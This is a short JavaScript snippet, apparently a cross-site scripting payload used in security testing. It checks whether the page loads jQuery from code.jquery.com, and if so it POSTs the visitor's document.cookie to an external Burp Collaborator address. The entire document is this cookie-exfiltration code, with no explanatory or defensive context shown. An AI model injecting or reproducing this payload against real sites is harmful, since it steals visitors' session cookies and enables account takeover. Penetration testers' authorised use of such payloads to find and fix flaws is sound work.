var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://exfyh9nuxpfdr1hzjdecdkzcy34usj.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
